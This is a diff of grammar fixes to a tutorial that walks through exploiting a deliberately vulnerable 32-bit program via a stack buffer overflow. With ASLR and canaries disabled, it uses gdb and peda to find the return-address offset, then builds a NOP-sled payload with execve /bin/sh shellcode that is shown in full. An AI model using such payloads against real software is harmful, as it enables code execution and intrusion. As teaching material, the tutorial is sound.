@@ -15,22 +15,22 @@ keywords: "buffer overflow, gdb, proof of concept, shellcode"
 This document will be an overview of a very basic buffer overflow.
 We will see the exploitation of a vulnerable program compile in 32 bit on an x86 architecture.
 
-A buffer overflow is a bug which appears when a process write in a memory buffer (stack or heap) and exceeds the allocated memory overwriting some information used by the process. When this bug appears non intentionally, the computer comportment is unpredictable, most of the time this result by a seg fault error.
-If the bug is exploited it can permit to the attacker to inject some code.
+A buffer overflow is a bug that appears when a process writes in a memory buffer (stack or heap) and exceeds the allocated memory, overwriting some information used by the process. When this bug appears non intentionally, the computer comportment is unpredictable, most of the time this results as a seg fault error.
+If the bug is exploited, it can permit attacker to inject some code.
 
-Along the years, security has been improved to prevent as much as possible this kind of bugs. To stem it developers did modify the kernel with the implementation of the ASLR (Address Space Layout Randomization) and the openwall patch. They also did modify the compiler by adding the canary. For this article all security will be disabled.
+Throughout the years, security has been improved to prevent this type of bug as much as possible. To block them, the developers have modifies the kernel with the implementation of the ASLR (Address Space Layout Randomization) and the openwall patch. The compiler is also modified by adding the canary. For this article all security will be disabled.
 
 There are other ways to exploit a buffer overflow like the ret into libc, or ROP, those techniques will not be explained in this article.
 
 # Few reminders
 
-When a program is executed, it is transformed to a process image by the program loader and a virtual memory space is allowed in RAM for it. The program loader will map all the loadable segment of the binary and the needed library with the system call mmap(). This virtual space is divided into two spaces, user and kernel space. The user space cannot access to the kernel space, but the kernel space can access user space. So in our case we will abuse the user space.
+When a program is executed, it is transformed to a process image by the program loader and a virtual memory space is allowed in RAM. The program loader will map all the loadable segment of the binary and the needed library with the system call, mmap(). This virtual space is divided into two spaces, user and kernel space. The user space cannot access kernel space, but the kernel space can access user space. So in our case we will abuse the user space.
 
 Register we need to know for the exploitation:
 - EIP (RIP for 64 bits) which correspond to the instruction pointe, this one contain the address of the next instruction to execute.
 - ESP (RSP for 64 bits) which correspond to the top stack pointer, it permit to see the element we insert on the stack.
 
-# The vulnerable programme
+# The vulnerable program
 
 ## Source code
 
@@ -90,7 +90,7 @@ clean:
 	rm -rf $(EXEC_V_32) peda-session-$(EXEC_V_32).txt
 ```
 
-Without those security the stack is executable, we remove the canaris, and the ASLR is deactivate.
+Without these securities the stack is executable, we remove the canary, and the ASLR is deactivate.
 
 # Exploitation
 
@@ -102,7 +102,7 @@ ou
 $ nm crackme-32
 ```
 
-Now we can launch `gdb` for get the information we need to exploit our crackme program.
+Now we can launch `gdb` to get the information we need to exploit our crackme program.
 
 ```sh
 $ gdb
@@ -113,7 +113,7 @@ gdb$ run $(python -c 'print "A" * 200')
 ```
 
 With this argument the program seg fault. The memory buffer has been filled and exceed.
-As we can see in the code above the buffer have a 128 bytes size.
+As we can see in the code above the buffer has a 128 bytes size.
 Now we need to find the offset for overwriting the EIP register.
 
 ```sh
@@ -121,7 +121,7 @@ gdb$ pattern create 200
 'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AA.....AAxAAyA'
 ```
 
-This command is a `peda` command which permit to generate a specific pattern which will help us to find the offset.
+This command is a `peda` command that permits to generate a specific pattern that will help us find the offset.
 
 So let's run the program with this pattern.
 
@@ -146,7 +146,7 @@ gdb-peda$ pattern offset AmAA
 AmAA found at offset: 140
 ```
 
-We have a 140 offset. So we know that we have to pass 140 octets before to put the address of the callMeMaybe function.
+We have a 140 offset. So we know that we have to pass 140 octets before putting the address of the callMeMaybe function.
 
 The callMeMaybe address is :
 
@@ -155,8 +155,8 @@ gdb-peda$ p callMeMaybe
 $1 = {void ()} 0x80484c6 <callMeMaybe>
 ```
 
-We have now everything we need to execute this command through the buffer overflow vulnerability.
-For call `callMeMaybe`, it is necessary to run the program with an offset of 140 followed by the address of the function in little endian (`0x80484c6` =>  `0xc6840408`).
+We now have everything we need to execute this command through the buffer overflow vulnerability.
+For call the function `callMeMaybe`, it is necessary to run the program with an offset of 140 followed by the address of the function in little endian (`0x80484c6` =>  `0xc6840408`).
 
 ```sh
 gdb-peda$ run $(python -c 'print "A" * 140 + "\xc6\x84\x04\x08"')
@@ -168,7 +168,7 @@ Great, we just got owned ;), we get the message `Pwned !!`.
 
 The Shellcode is a program composed of hexadecimal commands.
 
-Before, we had find the offset (140), we dispose of a 23 bytes shellcode which correspond to the `/bin/dash` command.
+Before, we found the offset (140), we dispose of a 23 bytes shellcode which correspond to the `/bin/dash` command.
 Now we need to find the address of our buffer. We can use `gdb` to get it, `A` equal to `0x41` in hexadecimal. Let's pass in argument two hundred `A` and check the ESP register to find them.
 
 ```sh
@@ -194,13 +194,13 @@ gdb$ x/100xg $esp
 0xffffd5a0:	0x72672d746962726f	0x535f474458006d61
 ```
 
-We can estimate than the buffer address is between `0xffffd4c0` and `0xffffd570`. Attention, the `gdb` address can be a bit different than when the program is running outside of it. For avoid this problem we will take an address in the middle of our buffer, for example `0xffffd510`, it is not important to target the exact buffer address because we will used a NOP sled.
+We can estimate that the buffer address is between `0xffffd4c0` and `0xffffd570`. Attention, the `gdb` address can be a bit different than when the program is running outside of it. To avoid this problem we will take an address in the middle of our buffer, for example `0xffffd510`, it is not important to target the exact buffer address because we will use a NOP sled.
 
-We now need a shellcode. You can write it yourself or you can find one it fit your needs on [shell-strom](http://shell-storm.org/shellcode/files/shellcode-827.php).
+We now need a shellcode. You can write it yourself or you can find one that fits your needs on [shell-strom](http://shell-storm.org/shellcode/files/shellcode-827.php).
 
-So now have all we need, we will start by inserting some x90 instructions in the buffer. The x90 instruction is called a NOP, it corresponds to a single clock time for the processor. So if the program executes those instructions it will not do anything until it arrived to our shellcode, it is called a NOP sled. We now put our shellcode just after the NOP sled, and we complete the offset with some padding to arrive to the 140 bytes. Finally we put the buffer address we took just before (`0xffffd510`), do not forget to put it in little endian.
+We now have all we need, we will start by inserting some x90 instructions in the buffer. The x90 instruction is called a NOP, it corresponds to a single clock time for the processor. So if the program executes those instructions it will not do anything until it arrives to our shellcode, it is called a NOP sled. We now put our shellcode just after the NOP sled, and we complete the offset with some padding to arrive to the 140 bytes. Finally we put the buffer address we took just before (`0xffffd510`), do not forget to put it in little endian.
 
-So it will look like that, 100 bytes (NOP sled) + 23 bytes (shellcode) + 17 (padding) + the buffer address in little endian.
+So it should look like this: 100 bytes (NOP sled) + 23 bytes (shellcode) + 17 (padding) + the buffer address in little endian.
 
 ```sh
 gdb$ run $(python -c 'print "\x90" * 100 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80" + "A" * 17 + "\x10\xd5\xff\xff"')
